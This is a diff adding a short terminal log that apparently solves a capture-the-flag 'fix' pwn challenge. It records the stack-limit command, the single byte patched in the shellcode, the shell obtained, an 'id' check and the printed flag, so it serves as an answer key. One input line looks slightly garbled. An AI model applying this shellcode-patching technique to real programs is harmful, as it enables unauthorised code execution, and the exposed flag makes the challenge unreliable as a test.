@@ -1,0 +1,12 @@
+fix@ubuntu:~$ ulimit -s unlimited
+fix@ubuntu:~$ ./fix
+What the hell is wrong with my shellcode??????
+I just copied and pasted it from shell-storm.org :(
+Can you fix it for me?
+Tell me the byte index to be fixed : 15
+9Tell me the value to be patched : 2
+get shell
+$ id
+uid=1049(fix) gid=1049(fix) egid=1050(fix_pwn) groups=1050(fix_pwn),1049(fix)
+$ cat flag
+Sorry for blaming shell-strom.org :) it was my ignorance!
